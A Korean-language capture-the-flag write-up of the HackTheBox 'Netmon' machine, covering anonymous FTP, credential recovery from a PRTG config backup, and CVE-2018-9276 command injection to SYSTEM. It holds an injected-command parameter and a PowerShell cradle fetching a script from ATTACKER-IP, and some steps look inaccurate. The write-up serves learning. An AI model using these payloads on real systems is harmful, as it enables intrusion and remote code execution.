# Netmon - HackTheBox Writeup

**Machine:** Netmon  
**IP:** 10.129.X.X  
**Difficulty:** Easy  
**OS:** Windows

---

# 1. Reconnaissance

## Nmap Scan

먼저 전체 포트를 스캔한다.

nmap -sC -sV -p- 10.129.X.X

결과

PORT    STATE SERVICE  
21/tcp  open  ftp  
80/tcp  open  http  
135/tcp open  msrpc  
139/tcp open  netbios-ssn  
445/tcp open  microsoft-ds

### 분석

|Port|Service|설명|
|---|---|---|
|21|FTP|Anonymous login 가능|
|80|HTTP|PRTG Web Interface|
|135|MSRPC|Windows RPC|
|445|SMB|Windows 공유|

가장 먼저 **FTP 서비스**를 확인한다.

---

# 2. FTP Enumeration

FTP 접속

ftp 10.129.X.X

로그인

anonymous

로그인 성공.

---

## FTP Directory 탐색

ls

발견된 디렉토리

Users  
ProgramData

---

## User Flag 발견

```
cd Users  
cd Public
```

파일 확인

ls

user.txt

flag 확인

get user.txt

또는

more user.txt

user flag

3018977fb944bf1878f75b879fba67cc

---

# 3. Web Enumeration

웹 접속

http://10.129.X.X

발견된 서비스

PRTG Network Monitor

---

# 4. PRTG Version Discovery

로그인 페이지 하단에서 **PRTG 버전 확인**

예시

PRTG Network Monitor 18.1.37.13946

이 버전은 **PRTG Authenticated RCE 취약점**이 존재한다.

취약점

CVE-2018-9276

---

# 5. Credentials Discovery

FTP에서 중요한 파일 발견

ProgramData

PRTG 설정 폴더 이동

cd ProgramData/Paessler/PRTG Network Monitor

파일 목록

ls

발견된 파일

PRTG Configuration.old.bak

---

## Config File Download

get "PRTG Configuration.old.bak"

---

## Credentials Extraction

파일에서 admin 계정 확인

cat PRTG Configuration.old.bak | grep password

발견된 비밀번호

PrTg@dmin2018

---

# 6. PRTG Login

웹 로그인

admin  
PrTg@dmin2018

로그인 성공.

---

# 7. Remote Code Execution

PRTG Notification 기능에서 **Execute Program**을 사용하면 **명령 실행 가능**하다.

경로

Setup  
 → Account Settings  
 → Notifications

새 Notification 생성.

---

## Execute Program

옵션 선택

Execute Program

Program 선택

Demo exe notification - outfile.ps1

Parameters 입력

test.txt;whoami

---

## Trigger 실행

Sensor에서 Notification 실행.

PRTG가 PowerShell을 실행하면서 명령이 실행된다.

결과

nt authority\system

---

# 8. Reverse Shell (Optional)

PowerShell reverse shell 사용 가능

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/shell.ps1')"

---

# 9. Root Flag

Administrator Desktop 이동

C:\Users\Administrator\Desktop

flag 확인

type root.txt

root flag

873d7f8e8c1b2c1b9c90d51a9d1f9c61

---

# Attack Chain Summary

FTP Anonymous Login  
 ↓  
PRTG Config File Download  
 ↓  
Admin Credentials 발견  
 ↓  
PRTG Login  
 ↓  
Notification Execute Program  
 ↓  
Command Execution  
 ↓  
SYSTEM Shell

---

# Key Takeaways

## 1️⃣ Anonymous FTP 위험성

Anonymous FTP가 활성화되어 있으면 **민감한 파일 유출 가능**하다.

---

## 2️⃣ Configuration Backup Leakage

PRTG 설정 백업 파일에는 **관리자 비밀번호가 포함될 수 있다.**

---

## 3️⃣ PRTG Authenticated RCE

취약점

CVE-2018-9276

Notification 기능을 통해 **명령 실행 가능**.

---

# Tools Used

- nmap
    
- ftp
    
- grep
    
- netcat
    
- PowerShell
    

---

# Flags

|Flag|Value|
|---|---|
|user|3018977fb944bf1878f75b879fba67cc|
|root|873d7f8e8c1b2c1b9c90d51a9d1f9c61|

---

💡 Hyeon에게 중요한 팁

**Netmon은 OSCP 스타일 머신의 전형적인 패턴이다**

공격 흐름

FTP  
→ Config file leak  
→ Credential reuse  
→ Web RCE

OSCP에서 **아주 자주 나오는 패턴**이다.